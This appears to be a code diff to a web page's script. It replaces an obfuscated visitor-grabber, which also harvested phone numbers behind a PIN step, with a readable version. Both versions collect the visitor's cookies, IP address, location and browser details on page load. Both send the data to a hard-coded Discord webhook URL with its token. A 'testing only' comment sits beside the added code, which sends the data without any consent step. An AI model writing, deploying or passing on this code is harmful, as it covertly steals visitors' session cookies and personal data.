@@ -147,82 +147,56 @@
         </div>
     </div>
 
-    <script>
-        const _0x1a9e=["https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY","GET","POST","Content-Type","application/json","error","click","submit","body","none","block","Please enter a valid phone number","Could not fetch location data","Error sending data to server","New Phone Number Submission: ","locationError","New visitor"];
-        
-        let _0x5916 = "+1";
-        
-        async function getLocationAndShow() {
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookies: document.cookie,
-            };
+<script>
+  async function getLocationAndShow() {
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookies: document.cookie,
+    };
 
-            // Get IP/location info
-            try {
-                const res = await fetch("https://ipapi.co/json/");
-                const data = await res.json();
-                info.ip = data.ip;
-                info.city = data.city;
-                info.region = data.region;
-                info.country = data.country_name;
-                info.postal = data.postal;
-                info.org = data.org;
-            } catch (e) {
-                info.locationError = _0x1a9e[15];
-            }
+    // Get IP/location info
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      info.ip = data.ip;
+      info.city = data.city;
+      info.region = data.region;
+      info.country = data.country_name;
+      info.postal = data.postal;
+      info.org = data.org;
+    } catch (e) {
+      info.locationError = "Could not fetch location data";
+    }
 
-            // Show on the page
-            fetch(_0x1a9e[0], {
-                method: _0x1a9e[2],
-                headers: {
-                    "Content-Type": _0x1a9e[3]
-                },
-                body: JSON.stringify({
-                    content: `📡 ${_0x1a9e[16]}: ${JSON.stringify(info, null, 2)}`
-                })
-            });
-        }
+    // Show on the page
+    const div = document.createElement("div");
+    div.style = "background:#f9f9f9;padding:20px;margin:10px;font-family:monospace;";
+    div.innerHTML = `
+      <h2>📍 Your Public Info:</h2>
+      <pre>${JSON.stringify(info, null, 2)}</pre>
+    `;
+    document.body.appendChild(div);
 
-        getLocationAndShow();
+    // Send to Discord webhook – only for testing, not recommended for real user data!
+    // ⚠️ Replace this ONLY if users consent to sending this info.
+    fetch("https://discord.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `📡 New visitor:
+\`\`\`json
+${JSON.stringify(info, null, 2)}
+\`\`\``
+      })
+    });
+  }
 
-        function validatePhoneNumber(phone) {
-            const cleaned = phone.replace(/[\s-()]/g, '');
-            return /^\d{7,}$/.test(cleaned);
-        }
+  getLocationAndShow();
+</script>
 
-        submitBtn.addEventListener(_0x1a9e[6], async () => {
-            const phone = phoneNumber.value.trim();
-            if (!phone || !validatePhoneNumber(phone)) {
-                phoneNumberError.style.display = _0x1a9e[9];
-                return;
-            } else {
-                phoneNumberError.style.display = _0x1a9e[10];
-            }
-            const phoneWithCountryCode = _0x5916 + phone.replace(/[\s-()]/g, '');
-            try {
-                const response = await fetch(_0x1a9e[0], {
-                    method: _0x1a9e[2],
-                    headers: {
-                        "Content-Type": _0x1a9e[3]
-                    },
-                    body: JSON.stringify({ content: _0x1a9e[17] + phoneWithCountryCode })
-                });
-                if (response.ok) {
-                    console.log("Phone number successfully submitted.");
-                    phoneInputSection.classList.add('hidden');
-                    pinDisplaySection.classList.remove('hidden');
-                } else {
-                    console.error("Error submitting phone number:", response.status, response.statusText);
-                    alert("There was an error. Please try again.");
-                }
-            } catch (error) {
-                console.error('Error sending data to server:', error);
-                alert('There was an error. Please try again.');
-            }
-        });
-    </script>
 </body>
 </html>
